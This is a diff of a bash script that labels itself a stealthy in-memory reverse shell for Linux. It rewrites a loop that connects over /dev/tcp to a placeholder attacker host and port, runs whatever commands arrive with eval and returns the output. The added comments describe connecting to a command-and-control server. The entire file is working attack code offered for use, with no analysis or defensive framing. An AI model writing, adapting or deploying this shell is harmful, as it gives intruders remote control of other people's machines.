@@ -1,17 +1,18 @@
 #!/bin/bash
-# Lightweight reverse shell (Linux, 2025-safe)
-# No bash history leak, works in memory, clean disconnect
+# Stage 3 — In-Memory Reverse Shell for Linux (Stealth 2025 Edition)
 
 HOST="REPLACE_IP"
 PORT=REPLACE_PORT
 
-exec 5<>/dev/tcp/$HOST/$PORT
+# Connect to C2 and read/execute commands in memory
+exec 5<>/dev/tcp/$HOST/$PORT || exit 1
+echo -n "$USER@$(hostname):~$ " >&5
+
 while read -r cmd <&5; do
-  if [[ "$cmd" == "exit" ]]; then
-    break
-  fi
-  output=$(eval "$cmd" 2>&1)
-  echo "$output" >&5
-  echo -n "\n$USER@$(hostname):~$ " >&5
+  [[ "$cmd" == "exit" ]] && break
+  out="$(eval "$cmd" 2>&1)"
+  echo "$out" >&5
+  echo -n "$USER@$(hostname):~$ " >&5
 done
+
 exec 5>&-
